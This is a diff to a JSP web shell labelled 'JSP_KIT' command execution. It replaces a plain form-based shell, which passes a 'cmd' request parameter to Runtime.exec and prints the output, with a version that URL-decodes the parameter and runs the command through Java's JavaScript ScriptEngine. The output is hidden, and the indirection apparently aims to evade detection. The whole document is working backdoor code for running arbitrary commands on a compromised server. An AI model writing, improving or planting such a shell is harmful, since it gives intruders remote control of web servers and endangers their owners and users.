@@ -1,23 +1,33 @@
-<%@ page import="java.util.*,java.io.*"%>
+<%@ page import="java.util.*,java.io.*,javax.script.*,java.net.*"%>
+<%
+//
+// JSP_KIT
+//
+// 1.jsp = Command Execution (unix)
+//
+// by: huzhanchi
+//
+%>
 <HTML><BODY>
-<FORM METHOD="GET" NAME="myform" ACTION="">
-<INPUT TYPE="text" NAME="cmd">
-<INPUT TYPE="submit" VALUE="Send">
-</FORM>
-<pre>
 <%
 if (request.getParameter("cmd") != null) {
-        out.println("Command: " + request.getParameter("cmd") + "<br>");
-        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
-        OutputStream os = p.getOutputStream();
-        InputStream in = p.getInputStream();
-        DataInputStream dis = new DataInputStream(in);
-        String disr = dis.readLine();
-        while ( disr != null ) {
-                out.println(disr);
-                disr = dis.readLine();
-                }
-        }
+        String n = request.getParameter("cmd");
+  try {
+        n = java.net.URLDecoder.decode(n, "UTF-8");
+			} catch (Exception e) {
+					  e.printStackTrace();
+			}
+        String j = System.getProperty("java.version");
+        ScriptEngineManager engineManager = new ScriptEngineManager();
+        ScriptEngine engine = null;
+        boolean b = j.indexOf("1.7") == 0 ? true : false;
+        engine = engineManager.getEngineByName("js");
+        String m = b ? "(function sum() {importPackage(java.util);importPackage(java.lang);Runtime.getRuntime().exec(a); return a; })(a)" :
+          "load(\"nashorn:mozilla_compat.js\");(function sum() {importPackage(java.util);importPackage(java.lang);Runtime.getRuntime().exec(a); return a; })(a)";
+        Bindings bindings = engine.createBindings();
+        bindings.put("a", n);
+        engine.setBindings(bindings, ScriptContext.GLOBAL_SCOPE);
+        engine.eval(m, bindings);
+  }
 %>
-</pre>
 </BODY></HTML>
